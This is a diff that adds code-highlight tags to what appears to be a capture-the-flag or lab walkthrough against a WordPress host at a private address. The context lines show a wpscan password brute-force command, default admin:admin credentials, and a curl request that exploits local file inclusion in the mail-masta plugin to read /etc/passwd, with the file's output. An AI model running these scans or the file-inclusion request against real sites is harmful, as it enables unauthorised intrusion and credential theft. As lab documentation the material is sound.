@@ -178,6 +178,7 @@ I tried lepton first and it seemed like it wasn't exactly working, possibly my V
 
 ## Wordpress
 
+{% highlight bash %}
 wpscan --url 10.37.129.6/wordpress --wordlist /usr/share/wordlists/wfuzz/others/common_pass.txt -e --random-agent --proxy 192.168.0.9:8080
 _______________________________________________________________
         __          _______   _____
@@ -402,11 +403,11 @@ _______________________________________________________________
 [+] Requests Done: 4523
 [+] Memory used: 168.398 MB
 [+] Elapsed time: 00:00:52
-
+{% endhighlight %}
 
 Try logging in as admin:admin, works
 
-
+{% highlight bash %}
 curl -v http://10.37.129.6/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
 *   Trying 10.37.129.6...
 * TCP_NODELAY set
@@ -462,6 +463,7 @@ sshd:x:114:65534::/var/run/sshd:/usr/sbin/nologin
 postgres:x:115:124:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
 tomcat6:x:116:126::/usr/share/tomcat6:/bin/false
 wpadmin:x:1001:1001::/home/wpadmin:/bin/sh
+{% endhighlight %}
 
 Still no way to get a password.
 
